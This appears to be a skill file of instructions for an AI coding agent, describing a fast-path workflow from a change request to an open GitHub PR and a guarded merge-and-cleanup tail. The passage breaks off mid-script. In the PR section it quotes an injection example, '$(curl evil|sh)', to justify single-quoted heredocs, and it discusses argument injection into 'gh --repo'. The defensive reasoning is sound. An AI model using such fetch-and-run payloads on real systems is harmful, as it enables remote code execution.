---
name: fix
description: "The fast path — a grounded change from request to open PR in one unattended run, with no cycle artifacts. Use when the user wants something done rather than specified: fix this, change this, rename that, drop the redundant prefix, update the frontmatter, make this consistent, just do this, small change, quick fix, one-line fix, tweak, open a PR for this. Also starts from an identifier instead of free text: /dev:fix linear ENG-123 works a Linear issue (start from a Linear issue, work this ticket, pick up an assigned issue), and /dev:fix backlog <item> works a docs/backlog/ item (work a backlog item, pay this tech debt, do that deferred item). Also handles the merge tail: /dev:fix merge merges that PR and cleans up. Escalates to /dev when the request carries 2+ unresolved decisions. For a full seven-stage cycle with approval gates use /dev."
---

# dev:fix — The Fast Path

**Announce:** "I'm using dev:fix to run this as a fast-path change."

## Purpose

`/dev`'s seven stages are correctly weighted for a real feature and absurdly heavy for a one-line
fix. This lane is the other weight: read the actual files, decide whether the request is safe to
carry alone, make the change, verify it, open a PR — then stop.

It produces **no cycle artifacts**. No worktree, no `spec.md`, no `state.json`, no `validation.md`,
no decision log. That is the feature, not an omission. Rigor here comes from grounding before
acting, running the suite, verifying what the suite cannot reach, capturing what was deferred, and
reporting honestly — the same standard carried by judgment instead of by paperwork.

**Two invocations, and the second is deliberate:**

- `/dev:fix "<what you want done>"` — the lane. Runs unattended to an open PR, then stops.
- `/dev:fix merge` — the tail. Merges that PR and cleans up.

Nothing irreversible happens without the second invocation. The PR is the checkpoint.

## Resolve the working directory (do this first)

This lane operates on the **primary checkout** — it never creates a worktree. Compute it without
relying on the shell's current directory, so the lane runs correctly from anywhere in the repo:

```bash
GIT_COMMON=$(git rev-parse --git-common-dir) || { echo "Not a git repository."; exit 1; }
PRIMARY=$(cd "$(dirname "$GIT_COMMON")" && pwd)
if [ -z "$PRIMARY" ]; then echo "Could not resolve the primary checkout."; exit 1; fi
```

The first two lines are the derivation every `dev` stage header uses (`build/SKILL.md:26-27`). The
third is the non-empty guard **none of those 13 shell sites carries** — the gap
`docs/backlog/debt-primary-cd-failure-unchecked.md` records. This site carries it, so adding the
lane does not grow that item's count to 14. Do not "simplify" the guard away to match the others.

For the rest of this lane: run every git command as `git -C "$PRIMARY" …`, **and resolve every file
path you read or edit against `$PRIMARY/`**. Never `cd`.

Both halves matter. The lane can legitimately be invoked from inside a `.dev-worktrees/<feature>`
tree, and anchoring only the git commands would ground and edit *that* worktree's files — a different
branch's content — while every commit targeted `$PRIMARY`. The commit would find nothing staged,
`gh pr create` would fail with "no commits between", and an in-flight cycle's worktree would be left
dirty. `dev:done` states both halves for the same reason (`done/SKILL.md:22-23`).

## Resolve the target repo

**Every `gh` call in this lane that accepts `--repo` passes `--repo "$SLUG"`.** (`gh repo view` takes
the slug positionally instead — `--repo` is an unknown flag there — and `gh auth status` takes
neither.) Without it, `gh` resolves the base repo from
the git remotes, and **its rule for a fork is to send the PR to the fork's *parent*** — so a lane run
in someone's fork would open a PR against an upstream they don't own, unattended, with the branch
already pushed. `dev:reflect` guards exactly this (`reflect/SKILL.md:212`); the lane needs it more,
because its own premise is that it runs across several repos.

The lane's target is always the repo it is operating in, so resolve the slug from `origin`:

```bash
SLUG=$(git -C "$PRIMARY" remote get-url origin 2>/dev/null \
  | sed -E 's|^ssh://||; s|^git@[^:/]+[:/]||; s|^https?://[^/]+/||; s|\.git$||')
if ! printf '%s' "$SLUG" | grep -Eq '^[A-Za-z0-9._][A-Za-z0-9._-]*/[A-Za-z0-9._][A-Za-z0-9._-]*$'; then
  echo "Could not resolve a valid owner/name for origin."; exit 1
fi
```

This is `../../references/tech-debt.md` §P9.target-resolution's allowlist **with the first character
anchored**, and it is validation rather than decoration. §P9's own form is
`^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+$`, and that form is described there as rejecting a value beginning
with `-` — an argument-injection vector into `gh --repo`. It does not: `-` is inside the character
class, so `-foo/bar` passes it. The anchored first character above is what actually delivers the
property §P9 claims. §P9 is the shared contract and this cycle does not rewrite it; the discrepancy is
recorded as `docs/backlog/debt-p9-slug-regex-allows-leading-dash.md`. A slug that fails this check is
a stop, never something to pass to `gh`.

The `sed` handles all four remote forms in use — `git@host:owner/name[.git]`,
`https://host/owner/name[.git]`, `ssh://git@host/owner/name.git`, and a credential-bearing
`https://user:token@host/owner/name.git`. The `^ssh://` strip is load-bearing rather than defensive:
without it an `ssh://` clone normalizes to a string with a host still attached, fails the allowlist,
and hard-exits — making the lane unusable in that clone. A port-bearing `ssh://host:443/…` form
still fails the allowlist, which is the correct direction to fail.

## Resolve the default branch

Never assume `main`:

```bash
DEFAULT_BRANCH=$(gh repo view "$SLUG" --json defaultBranchRef -q .defaultBranchRef.name 2>/dev/null) \
  || DEFAULT_BRANCH=""
if [ -z "$DEFAULT_BRANCH" ]; then
  DEFAULT_BRANCH=$(git -C "$PRIMARY" symbolic-ref --short refs/remotes/origin/HEAD 2>/dev/null | sed 's|^origin/||')
fi
if [ -z "$DEFAULT_BRANCH" ]; then echo "Could not determine the default branch."; exit 1; fi
```

`dev:done` hardcodes `main` (`done/SKILL.md:26`). The lane deliberately does not copy that — it runs
across several repos, and not all of them use `main`.

**Resolve this after Step 2's check 1, not before it.** The `gh repo view` call is a network round
trip, and check 1 is the lane's cheapest failure. The `2>/dev/null` fallback means an unauthenticated
`gh` degrades here rather than erroring, and check 1 then STOPs with the right reason — but doing the
work in that order keeps the stated rationale true. If both rungs come back empty on a healthy repo
(single-branch clones and many older clones have no `refs/remotes/origin/HEAD`), try
`git -C "$PRIMARY" remote show origin` before giving up.

## Step 1: Parse the argument

**Reads.** Read these once at the start of the run and work from that reading:

- `../../references/entry-adapters.md` — the adapter seam contract (§A1 hooks, §A2 argument tokens,
  §A3 Linear, §A4 backlog). Only the adapter dispatches consume §A3/§A4; the parse below is §A2.
- `docs/dev/config.json` — the `linear.<teamId>.{started,in_review}` status-ID cache (§A3). Read on
  the **`linear` dispatch only**, and legitimately absent on every other path — a repo with no
  `/dev` setup, or any non-Linear invocation, never needs it.

**The parse is four-way**, and the order matters:

| Argument | Dispatch |
|---|---|
| the bare token `merge`, and nothing else | **tail mode** (Step 7) |
| `linear`, alone or followed by one identifier | **Linear adapter** (Step 2a) |
| `backlog` followed by exactly one identifier | **backlog adapter** (Step 2a) |
| anything else | **free text** — the lane's catch-all |

**The bare `merge` token is exact, never prefix-matched.** Any longer argument — including one whose
first word is `merge` — is a free-text lane request. `/dev:fix merge the two config loaders` is a
request to merge two config loaders, not a request to merge a PR. Merging is the one irreversible step
in this skill, so the token that triggers it is exact rather than prefix-matched.

**The adapter tokens inherit that discipline** (§A2). `linear` and `backlog` are adapter tokens **only**
when followed by nothing or by a single well-formed identifier. Anything longer is free text:
`/dev:fix linear auth is broken` is a request about Linear auth, not an adapter invocation.
Prefix-matching here would silently swallow a real request whose first word happens to be `linear` or
`backlog`.

**The two no-identifier forms differ, deliberately.** `linear` with no identifier opens the issue
picker (§A3). `backlog` with no identifier is an **error** — resolution in the store is by *existence*
of a named file, and there is no picker over it. Say which is missing rather than guessing.

No argument at all → ask what the user wants done. Do not guess.

## Step 2: Preflight

**The first three checks run in both modes**, before anything is created, in this order.

1. **`gh` available and authenticated** — `gh auth status`. On failure STOP with the reason. Checked
   first because it is the cheapest and neither mode can finish without it.
2. **Clean working tree** — `git -C "$PRIMARY" status --porcelain`. If anything is modified, STOP and
   name the files. Never stash, never branch over uncommitted work.
3. **No legacy in-place `/dev` cycle occupying the primary checkout** — scan
   `$PRIMARY/docs/dev/*/state.json` for a cycle whose `worktreePath` is `null` and whose `stage` is
   not `"done"`. If one exists, STOP and name that feature.

   Check 2 does **not** catch this: a legacy cycle commits its artifacts as it goes, so it leaves the
   tree clean while still occupying the primary checkout on its own feature branch. A modern cycle
   lives in `.dev-worktrees/` and does not contend — it must not trigger this refusal.

**The fourth check is lane mode only:**

4. **The current branch has no open PR:**

   ```bash
   CURRENT=$(git -C "$PRIMARY" branch --show-current)
   if [ -n "$CURRENT" ]; then
     gh pr list --repo "$SLUG" --head "$CURRENT" --state open
   fi
   ```

   The non-empty guard is required: on a detached-HEAD `$PRIMARY` the substitution is empty, and
   `--head ""` drops the filter and lists **every** open PR — a spurious refusal. If a PR exists,
   STOP and report it, offering the two exits: `/dev:fix merge`, or switch branches manually.

   This is the lane's own leftover state. The lane stops at PR and leaves `$PRIMARY` on that feature
   branch, so a second *lane* invocation would otherwise branch off `$DEFAULT_BRANCH` and strand the
   first PR — which the tail, defined as operating on the current branch, could then no longer reach.

   **In tail mode this same condition is the expected precondition, not a refusal.** Skip check 4
   entirely and go to Step 7. Running it in both modes would make `/dev:fix merge` always STOP while
   offering `/dev:fix merge` as the exit — an infinite loop.

## Step 2a: Resolve the adapter

**Free-text dispatch skips this step entirely** — there is no adapter, and the request text is what
the user typed. The step exists for the `linear` and `backlog` dispatches, and it implements the
seam's **Resolve** and **Pre-lane** hooks (`../../references/entry-adapters.md` §A1).

It runs **after Step 2's preflight and before Step 3's grounding**, which is the placement the whole
adapter design rests on: everything that can fail here fails **before Step 5 creates any branch**, so
a stop at this point has created nothing.

### `linear` dispatch

Follow §A3, in its order — do not restate it here, and do not reorder it:

1. **Availability.** Confirm the `linear-server` MCP responds. On absence, timeout, or auth failure,
   **STOP naming the reason.** No branch exists yet, so nothing needs unwinding. A missing Linear
   degrades this one adapter — the `backlog` dispatch and free-text lane never reach this check.
2. **Fetch** the issue (or open the picker when no identifier was given), recording `<ID>`, `<url>`,
   `<teamId>`, `<gitBranchName>`, and the current status.
3. **Status resolution** — read the cache, or ask the two questions against the live status list.
   Hold the resolved IDs in-turn; **the `config.json` write is deferred to Step 5**, after
   `checkout -b`, per §A3's persistence rule.
4. **Pre-lane hook** — set the issue's `started` status, with §A3's two guarded branches (already at
   or past the target → skip and note it; write permission missing → warn, continue, and say so in
   the final report).

The issue's title and description become the request text; its stated as-is claims are exactly the
class Step 3 must verify.

### `backlog` dispatch

Follow §A4:

1. **Resolve** `$PRIMARY/docs/backlog/<item>.md`, applying §A4's bare-slug normalization. **The
   normalization must complete here**, before Step 5 derives the branch name from `<item>` — the
   branch is what carries the item's identity into the separate `/dev:fix merge` invocation.
2. **Refuse** on `status: closed` (reopening is a decision the lane must not make) or
   `status: promoted` (naming the `promoted_to` product plan). Proceed only on `status: open`.
3. **Bind** the request text (the item body), the grounding hints (front-matter `files:`), and the
   display label (which **is** `<item>`).

This adapter has **no external dependency**. A missing or unauthenticated Linear MCP never reaches
this path, and the `backlog` dispatch works in a repo that has never configured Linear at all.

Its **Pre-lane and Post-PR hooks are no-ops** — a backlog item has no external status to move. That
is the seam's "a hook with nothing to do is a no-op, never an error" invariant (§A1), stated here so
the absence does not read as an oversight.

## Step 3: Ground

Read the actual files. Verify every as-is claim the request makes against what is really there.

**On an adapter-sourced request, grounding is not skipped or shortened.** The request text came from
an issue or an item rather than from the user's own typing, which makes its as-is claims *more* worth
verifying, not less — nobody re-read them when they were written down either.

**Grounding hints are a starting point, not a boundary.** On the `backlog` dispatch, the item's
front-matter `files:` name where to look first. They do not define the set: the rule above — that a
named set is enumerated by sweep rather than recall — governs unchanged, and an item's `files:` list
can itself be stale.

**No edit may come from a remembered mental model of the code.** If the request says "the frontmatter
has a redundant prefix," open the frontmatter. If it names a set ("all the dev skills"), enumerate
that set by sweep, not by recall — a set named from memory is the most common way a mechanical
change misses a file.

Record what was read and what each file confirmed or contradicted. This becomes the "What I
verified" section of the PR body.

**Nothing to change.** If grounding shows the request is already satisfied, say so plainly, create no
branch, and open no PR. An empty PR is worse than no PR.

## Step 4: Triage

Before changing anything, count the decisions this lane would be making **for** the user — points
where a reasonable person could choose differently.

| Decisions | Behavior |
|---|---|
| 0 | Proceed, **regardless of size**. A mechanical 14-file rename qualifies. |
| 1 | Ask it inline, then proceed. One question is cheaper than a whole cycle. |
| 2+ | **Stop.** List the decisions, print the `/dev` command, and offer to proceed if the user answers them here. |

**Size is deliberately not the trigger.** A 14-file frontmatter rename where the convention is
already established is trivially safe. A one-file change with two defensible answers is not.

**Counting rule.** A decision is countable only if **all three** hold:

- (a) the request text does not determine it,
- (b) no existing repo convention determines it, and
- (c) reversing it later would require editing files this change touches.

A choice already settled by an established convention counts as **zero** — that is what lets a large
mechanical change proceed. When genuinely unsure whether something is countable, **count it**: the
cost of a false escalation is one `/dev` command; the cost of a false proceed is a decision made on
the user's behalf that they never saw.

**What distinguishes the 1 row from the 2+ row.** Both can end in proceeding, so the observable
difference matters:

- **1 decision** — ask inline and proceed in the same turn. Do not print the `/dev` command.
- **2+ decisions** — **always print the `/dev` command** before asking, and never begin changing
  files in the same turn as the question.

That printed command is the marker that the escalation actually happened.

Worked examples:

- *"drop the redundant plugin prefix from the dev skill names"* — 14 files, mechanical, and the bare-
  prefix convention is already established elsewhere in the repo. **0 decisions. Proceed.**
- *"add caching to the config loader"* — which cache, and invalidated when? Neither is determined by
  the request or by convention, and both would require re-editing the loader to reverse.
  **2 decisions. Stop.**

## Step 5: Branch

**Resolve the final name before creating anything, and bind it to `BRANCH_NAME`.** Every step after
this one uses that variable, never a literal — the three dispatches produce three different shapes and
only one of them starts with `fix/`.

| Dispatch | `BRANCH_NAME` |
|---|---|
| free text | `fix/<kebab-summary>` |
| `backlog` | `fix/<item>` |
| `linear` | `<gitBranchName>`, or the free-text derivation on allowlist failure |

**Free text.** Name the branch `fix/<kebab-summary>`, where `<kebab-summary>` describes the change in
2–4 words. The allowlist applies to `<kebab-summary>` **alone**, not to the full branch name — a
prefixed `fix/…` can never match the anchored `^[a-z0-9][a-z0-9-]*$` because the `/` would be
collapsed. Normalize by `dev:spec` Step 6's construction (`spec/SKILL.md:135`): lowercase, collapse
every run of characters outside `[a-z0-9]` to a single `-`, strip leading and trailing `-`. If the
result is empty, ask for a name rather than proceeding.

**`backlog` dispatch.** The branch is `fix/<item>` — the normalized on-disk basename from Step 2a,
unchanged. `<item>` already satisfies the `<kebab-summary>` allowlist by construction (store slugs are
lowercase kebab per `../../references/tech-debt.md` §P2), so it is not renormalized. **This is not
cosmetic:** `/dev:fix merge` is a separate invocation and the lane persists no `state.json`, so
`$BRANCH` is the tail's only durable signal — naming the branch from `<item>` is what carries the
item's identity across the two invocations (§A4).

**`linear` dispatch.** Use `<gitBranchName>` when it passes **§A3's full-branch-name allowlist** —
`^[A-Za-z0-9][A-Za-z0-9._/-]*$` plus its `..`, `//`, leading/trailing `/`, and length rejections. That
is deliberately **not** the `<kebab-summary>` allowlist above: Linear branch names are *full* names of
the form `<user>/<id>-<title>`, and a segment-only rule would reject every real value and make the
fallback unconditional. On failure, fall back to the free-text derivation rather than refusing the
work. Do not "unify" the two allowlists; §A3 states why.

**Collision check — both, before creating the branch:**

```bash
git -C "$PRIMARY" rev-parse --verify "refs/heads/$BRANCH_NAME" >/dev/null 2>&1          # local
git -C "$PRIMARY" ls-remote --exit-code --heads origin "$BRANCH_NAME" >/dev/null 2>&1  # remote
```

On either hit, disambiguate with a `-2`, `-3` suffix. Never reuse an existing branch, and never
force-push over one.

**Exception — on the `backlog` dispatch a collision is a STOP, never a suffix.** `fix/<item>-2` makes
the tail's `${BRANCH#fix/}` resolve to no file, and the closeout is a silent no-op in that case, so
the item would never close and nothing would say so. Stop instead, naming the existing branch and the
two exits: `/dev:fix merge` if a PR is open on it, or delete/rename it by hand. This is reachable on
the ordinary retry path — Step 6's mid-flight escalation commits partial work and leaves the branch
behind (§A4).

Then create it from the freshly fetched default branch:

```bash
git -C "$PRIMARY" fetch origin
git -C "$PRIMARY" checkout -b "$BRANCH_NAME" "origin/$DEFAULT_BRANCH"
```

**On the `linear` dispatch, perform §A3's deferred `config.json` cache write immediately after this
`checkout -b` succeeds** — the resolved status IDs have been held in-turn since Step 2a precisely so
this write has a branch to land on. Commit it under its own pathspec, so it can never be swept into
the change commit:

```bash
git -C "$PRIMARY" add docs/dev/config.json
git -C "$PRIMARY" commit -F - -- docs/dev/config.json   # single-quoted heredoc, per the PR rule below
# message: chore: cache linear status ids for team <teamId>
```

Skip this write entirely when the cache was already populated, or when the repo has no
`docs/dev/config.json` at all (§A3).

## Step 6: Change, Verify, PR

### Change

Make the minimal edit that does the job. Commit it with a conventional-commit message — **always** via
`git commit -F -` with a **single-quoted** heredoc, never `-m "<message>"`, for the reason spelled out
under **PR** below. The rule is unconditional rather than "when the message carries quoted text",
because deciding whether your own message contains something shell-significant is exactly the
judgment that fails.

**Mid-flight discovery.** If implementation reveals a real fork that grounding missed — a decision
that would have been countable at Step 4 — **stop and escalate at that point** rather than deciding
to keep momentum. The Step 4 count is a prediction, and a prediction that turns out wrong is a reason
to stop, not a commitment to honor.

On that stop: **commit the partial work to the feature branch** and report the branch name and what
is on it. Open no PR. Do not leave the tree dirty (Step 2's check would then refuse the follow-up
invocation with a confusing "modified files" message) and do not revert (that discards real work over
a question).

### Verify

Run the repo's test suite if one exists. **Detect it rather than assuming** — `package.json` scripts,
`pytest`, a `Makefile` target, a `test_*.py` convention, `cargo test`, `go test ./...`.

Then verify by whatever means the change actually requires, **including means the suite cannot
reach**: reading rendered output, walking a procedure manually against real files, checking a page in
a browser. Record each result verbatim for the PR body.

**No suite in the repo?** Say so explicitly in the PR body rather than implying tests passed. An
absent suite **raises** the bar on other verification; it does not lower the bar overall.

### The rigor floor

The lane may never skip these, and the PR body says which applied:

- Grounded before acting — no edit from a remembered mental model of the code.
- Ran the project's test suite when one exists.
- Never claimed unverified success; if something could not be verified, said so.
- Captured anything deferred to `docs/backlog/` rather than dropping it.
- Reported what it decided on the user's behalf.

### Deferred-work capture

Anything noticed and not done goes to `docs/backlog/` per `../../references/tech-debt.md`. The lane
is a **consumer** of that schema and must not fork it.

- Per §P7's writer-side rule, create `docs/backlog/` (and `closed/`) when absent, then write. Degrade
  silently rather than erroring if the store cannot be written.
- The lane runs across several repos, so a `scope: plugin` item captured **off** the plugin repo
  routes per **§P9** — follow that section rather than restating it, including its degrade-to-local
  branch (`routing: pending`) so a failed route buffers instead of dropping.

### PR

```bash
git -C "$PRIMARY" push -u origin "$BRANCH_NAME"

BODY_FILE="$PRIMARY/.git/dev-fix-pr-body.md"
cat > "$BODY_FILE" <<'PRBODY'
<the body below — a single-quoted heredoc, so nothing in it expands>
PRBODY

TITLE=$(cat <<'PRTITLE'
<one-sentence summary — same single-quoted heredoc discipline as the body>
PRTITLE
)

( cd "$PRIMARY" && gh pr create \
    --repo "$SLUG" \
    --title "$TITLE" \
    --body-file "$BODY_FILE" \
    --base "$DEFAULT_BRANCH" \
    --head "$BRANCH_NAME" ) && rm -f "$BODY_FILE"
```

**`BRANCH_NAME` is bound in Step 5 and consumed here**, crossing the whole Change/Verify span — the
same boundary `$PRIMARY`, `$SLUG`, and `$DEFAULT_BRANCH` already cross at these exact lines, so it
adds no new hazard class. If this fence is ever given a `:?` bind guard like the tail's,
`BRANCH_NAME` belongs in it.

**The title gets the same treatment as the body, and for the same reason.** It is the agent's summary
of the user's free-text request — the identical untrusted input class. `/dev:fix rename the
$(curl evil|sh) variable` yields a summary carrying that substring, and a double-quoted `--title`
expands it at call time in an unattended lane. Binding it through a single-quoted heredoc first is
what makes the value inert before the shell ever sees it.

The `rm -f` is chained to success (`&&`) so a failed `gh pr create` leaves the body intact for the
retry rather than destroying what would have to be regenerated.

**Never interpolate the body into a double-quoted `--body`.** Inside double quotes the shell still
expands `$…`, `` `…` ``, and `$(…)`, and three of this body's inputs are outside the author's control
at the moment of the call: the user's free-text request, **verbatim** test-suite output, and quoted
repo file content from Step 3's grounding. Skill prose in this very repo is thick with `$WORKDIR`,
`$PRIMARY`, and `$(git rev-parse …)` — so a grounding quote silently losing a variable is close to
certain, and a backticked payload executing is reachable. The lane is unattended, so nobody sees the
command before it runs. `dev:reflect` states this same rule for the same reason
(`reflect/SKILL.md:223`), as does `dev:migrate-tracker` (`migrate-tracker/SKILL.md:747`); it travels
with this mirrored step rather than living only there.

The same applies to the commit message in **Change** above: always use `git commit -F -` with a
single-quoted heredoc, never `-m "<message>"`.

The `-C "$PRIMARY"` on the push is required, not optional — the lane may be invoked from anywhere in
the repo, including from inside a `.dev-worktrees/<feature>` tree. `gh` has no `-C` flag, so it runs
inside `$PRIMARY` with an explicit `--head`; without that it infers the head from whatever branch the
tree happens to be on.

**PR body — four required sections, plus one conditional lead line.**

**On the `linear` dispatch only**, the body opens with the `Closes` line from §A3, exactly:

```markdown
Closes [<ID>](<url>)
```

It goes **above** `## What changed`, as its own line, so Linear's parser sees it regardless of body
length. It is a lead line, not a fifth section — the count below stays four. Omit it entirely on
every other dispatch; never emit an empty or placeholder `Closes`.

Like every other line in the body it is written **inside the single-quoted heredoc**. The ID and URL
are external input from Linear, and the rule below — never interpolate the body into a double-quoted
`--body` — applies to them exactly as it applies to grounding quotes and test output.

```markdown
## What changed
[the edit, concretely]

## Why
[the request, and what grounding confirmed]

## What was verified
[suite result verbatim, or "no test suite in this repo"; plus whatever else was checked
 and how — and anything that could NOT be verified, stated plainly]

## Decisions made for you
[the 1-decision question and its answer, or "none"]
```

**This mirrors `dev:pr` Step 4 (`pr/SKILL.md:115-144`), which is canonical.** It is duplicated
because the lane produces no `validation.md` and so cannot enter that stage — every `/dev` stage
gates on the prior stage's artifact, and a lane that writes no artifacts cannot enter the chain
anywhere. A change to either side should be reflected at the other. `dev:pr` Step 4 carries the
matching pointer back to here. Two branches of the canonical are **deliberately absent**: its
base-branch resolution via `state.json.parentFeature` (the lane has no state file and always targets
`$DEFAULT_BRANCH`) and its nested-cycle push of the parent branch (`pr/SKILL.md:128-132`) — the lane
never nests. The `Closes` lead line is **shared** rather than absent: both sides emit the identical
`Closes [<ID>](<url>)` format, on different transports (§A3).

### Post-PR hook

**Immediately after `gh pr create` succeeds**, on the `linear` dispatch, set the issue's `in_review`
status per §A3 — the seam's Post-PR hook (§A1). Both guarded branches apply here exactly as they do
at Pre-lane: an issue already at or past that status is **not** moved backwards (skip the write and
note it), and a `save_issue` that fails on permissions is a **warning, not a stop** (the change and
the PR are already real; say in the report that the status was not updated).

The hook fires here rather than at Pre-lane because the lane's two irreversible boundaries are *work
started* and *PR opened*, and the two cached statuses map one to each. Setting `in_review` any earlier
would announce a PR that does not exist yet.

On every other dispatch this hook is a **no-op, not an error** (§A1).

### Stop

Report the PR URL and end the turn. **The PR is the checkpoint — the lane never merges.**

**On an adapter-sourced run, the report also names the source and what moved.** For `linear`: the
issue ID, the status it now holds, and — when either status write was skipped or failed — which one
and why, in plain words rather than as an omission. For `backlog`: the `<item>` the branch is named
for, and that it stays `status: open` until `/dev:fix merge` closes it.

## Step 7: The merge tail (`/dev:fix merge`)

**The tail is idempotent and safe to re-run.** Every step below tolerates having already happened, so
a partial failure is recovered by running `/dev:fix merge` again — not by hand-finishing it.

### Resolve the branch and PR

Bind both to variables **before** anything mutates them, and use the variables everywhere after. The
canonical reads `pr_number` and `branch` from `state.json`; the lane has no state file, so the values
must be captured here or they will be re-derived later against a checkout that has already moved:

```bash
BRANCH=$(git -C "$PRIMARY" branch --show-current)
if [ -z "$BRANCH" ]; then echo "STOP: $PRIMARY is in detached HEAD — check out the feature branch first."; exit 1; fi
if [ "$BRANCH" = "$DEFAULT_BRANCH" ]; then
  git -C "$PRIMARY" fetch --quiet origin "$DEFAULT_BRANCH" 2>/dev/null || true
  SCAN_REF="origin/$DEFAULT_BRANCH"
  git -C "$PRIMARY" rev-parse --verify --quiet "$SCAN_REF" >/dev/null || SCAN_REF="$DEFAULT_BRANCH"
  LEFTOVER=$(git -C "$PRIMARY" for-each-ref --format='%(refname:short)' \
    --merged "$SCAN_REF" 'refs/heads/fix/*')
  if [ -n "$LEFTOVER" ]; then
    echo "STOP: $PRIMARY is on $DEFAULT_BRANCH, but these already-merged fix branches remain:"
    echo "$LEFTOVER"
    echo "If a tail was interrupted, resume it from the relevant one:"
    echo "  git -C \"$PRIMARY\" checkout <branch> && /dev:fix merge"
  else
    echo "STOP: $PRIMARY is on $DEFAULT_BRANCH — nothing to merge (the tail already completed)."
  fi
  exit 1
fi

PR_NUMBER=$(gh pr list --repo "$SLUG" --head "$BRANCH" --state open --json number -q '.[0].number')
ALREADY_MERGED=0
if [ -z "$PR_NUMBER" ]; then
  PR_NUMBER=$(gh pr list --repo "$SLUG" --head "$BRANCH" --state merged --limit 1 --json number -q '.[0].number')
  ALREADY_MERGED=1
fi
if [ -z "$PR_NUMBER" ]; then echo "STOP: no open or merged PR for '$BRANCH'."; exit 1; fi
```

If more than one **open** PR resolves for the branch, stop and report rather than guessing.

**The scan globs `refs/heads/fix/*`, so it does not cover a Linear-sourced branch.** That scoping is
kept deliberately — see the `--merged` paragraph below, where it is what stops the scan listing
colleagues' branches on a repo using `fix/` as a team convention. Widening it would resurrect exactly
that. The cost is a named gap: an interrupted tail on a branch named from Linear's `gitBranchName`
(conventionally `<user>/<id>-<title>`) is not listed, so the guard falls through to its flat
"nothing to merge" message. Per the `--merged` reasoning below, that class of miss is permanent
rather than transient, so it is stated here rather than left for a reader to discover. Recovering
from it is manual: check out the branch and re-run `/dev:fix merge`.

**The `$DEFAULT_BRANCH` guard is not redundant with idempotency.** After a completed tail, `$PRIMARY`
is on `$DEFAULT_BRANCH` — so a re-run would bind `BRANCH` to it. On any repo that receives fork PRs
(whose head ref is commonly named `main`), the merged-state fallback would then resolve an unrelated
third party's PR, set `ALREADY_MERGED=1`, and run the cleanup against the default branch: GitHub
refuses the deletion, but the lane prints an alarming "protected or insufficient token scope" warning
and reports four end states for a PR it never touched.

**The guard is a stop, not a dead end.** A tail *can* be interrupted after the checkout succeeded but
before deletion finished — `delete_feature_branch`'s own `gh pr view` can hit the transient failure it
is designed to fail closed on. In that state `$PRIMARY` is on `$DEFAULT_BRANCH` with the feature
branch still present, and a flat "the tail already completed" would push the user into exactly the
hand-finishing this section forbids. So the guard looks for a leftover `fix/*` branch and, when it
finds one, names it and prints the command to resume from it.

**The `--merged` filter is the load-bearing part of that scan, not a refinement.** An interrupted tail
always leaves its branch merged — the `gh pr merge` succeeded, so the feature tip is an ancestor of
`origin/$DEFAULT_BRANCH`. An unrelated branch with a still-open PR never is. Without the
filter, any repo that uses `fix/` as a team branch convention — and the lane runs across several
repos — would list colleagues' branches under a heading saying to resume from one, and resuming from
a branch whose PR is still **open** would bind `ALREADY_MERGED=0` and merge that unrelated PR.
Nothing downstream would catch it. The listed branches are candidates; a branch whose PR is still
open is by construction not among them.

**Scan against `origin/$DEFAULT_BRANCH`, not the local ref — that distinction is the whole fix.** The
local default branch only advances via the `pull --ff-only` below, which is the exact command whose
failure produces `RECONCILED=0`. So in the compound failure this guard most needs to catch — pull
fails *and* `delete_feature_branch` fails, which share causes like network loss or an expired token
backing both `git` and `gh` — the local ref still sits at the pre-merge tip, the merged branch is not
its ancestor, and a local-ref scan would report "nothing to merge (the tail already completed)" while
the remote branch is still up. That miss is permanent, not transient: the local ref never advances on
its own. The `fetch` refreshes the remote-tracking ref best-effort and the `rev-parse` fallback keeps
the scan working in a repo that has no such ref.

**Why the merged-PR fallback exists.** Once `gh pr merge` succeeds the PR is no longer open, so a
failure anywhere downstream — a `checkout` blocked by another worktree holding `$DEFAULT_BRANCH`, a
`pull --ff-only` refusal — would leave a re-run unable to find its own PR and permanently unable to
finish the cleanup. Without this fallback the guard's own "re-run `/dev:fix merge`" advice would be
impossible to follow. When `ALREADY_MERGED=1`, **skip the mergeability check and the merge itself**
and resume at the cleanup.

### The branch-deletion guard

The cleanup goes through one guarded helper, `delete_feature_branch`. It **refuses to delete anything
unless the PR actually merged**, so a `gh pr merge` that failed (branch protection, a check that
flipped, stale mergeability, a transient API error) can never delete unmerged work. It fails closed:
an empty result from `gh pr view` — network error, auth loss — is `!= "MERGED"` and returns 1. Both
deletions are idempotent and safe to re-run.

**It is defined inside the same fenced block as the call site below, deliberately.** A shell function
lives only in the shell invocation that defined it, and the mergeability step between here and there
tells you to *wait and re-query* — an explicit pause that all but guarantees a separate invocation.
Defining it in its own earlier block would put document order right and still produce
`command not found` at exactly the moment the merge has already succeeded. Keep definition and call
in one script.

**The same argument applies to the values, which is why the fence opens with a bind guard.**
`PRIMARY`, `SLUG`, `BRANCH`, `PR_NUMBER`, `DEFAULT_BRANCH`, and `ALREADY_MERGED` are all set in
earlier blocks, and an unset variable here fails far worse than a missing function:
`[ "$ALREADY_MERGED" -eq 0 ]` errors and evaluates false, **silently skipping the merge**, and
`git -C ""` is not an error at all — git just operates on the current directory, so a lane invoked
from inside a `.dev-worktrees/<feature>` tree would detach an unrelated cycle's worktree. The `:?`
expansions turn all of that into one loud stop. The tail's blocks are one script: if you run the
merge block separately, re-run the resolution blocks first in the same invocation.

### Check mergeability

Skip this entirely when `ALREADY_MERGED=1`.

```bash
gh pr view "$PR_NUMBER" --repo "$SLUG" --json mergeable,mergeStateStatus
```

GitHub computes mergeability asynchronously, so immediately after PR creation the result can be
`UNKNOWN`/`null` — if so, wait a few seconds and re-query. **Never STOP on `UNKNOWN`.** Stop on
`DIRTY`, `BLOCKED`, or `BEHIND`. On `UNSTABLE` (failing non-required checks) report what is failing
and confirm before proceeding — a lane whose whole safety story is "the PR is the checkpoint" should
not merge past red checks silently. Proceed on `CLEAN` or `HAS_HOOKS`. Never force, and never delete
a branch whose PR did not merge.

### Merge, then clean up

```bash
: "${PRIMARY:?run the resolution blocks first, in this same invocation}" \
  "${SLUG:?}" "${BRANCH:?}" "${PR_NUMBER:?}" "${DEFAULT_BRANCH:?}" "${ALREADY_MERGED:?}"

delete_feature_branch() {
  if [ "$(gh pr view "$PR_NUMBER" --repo "$SLUG" --json state -q .state)" != "MERGED" ]; then
    echo "STOP: PR is not MERGED — leaving the feature branch intact. Resolve, then re-run /dev:fix merge."
    return 1
  fi
  git -C "$PRIMARY" push origin --delete "$BRANCH" 2>/dev/null || {
